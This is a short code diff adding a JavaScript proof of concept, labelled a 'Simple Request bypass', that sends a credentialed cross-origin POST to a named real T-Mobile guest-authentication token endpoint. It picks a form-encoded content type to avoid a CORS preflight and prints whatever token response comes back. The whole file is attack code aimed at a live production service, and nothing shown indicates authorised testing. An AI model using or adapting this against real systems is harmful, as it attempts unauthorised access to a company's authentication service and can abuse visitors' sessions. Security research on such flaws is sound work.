@@ -1,0 +1,26 @@
+document.getElementById('runBtn').onclick = function() {
+    var output = document.getElementById('output');
+    output.innerText = "Attempting Simple Request bypass...";
+
+    var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
+
+    fetch(target, {
+        method: 'POST',
+        mode: 'cors',
+        credentials: 'include',
+        headers: {
+            // This content-type does NOT trigger an OPTIONS preflight
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        // We send JSON inside a form-encoded body to see if the backend parses it anyway
+        body: '{"grant_type":"guest"}' 
+    })
+    .then(function(response) {
+        return response.text().then(function(text) {
+            output.innerText = "Status: " + response.status + "\n\nBody: " + text;
+        });
+    })
+    .catch(function(err) {
+        output.innerText = "Fetch Error: " + err;
+    });
+};
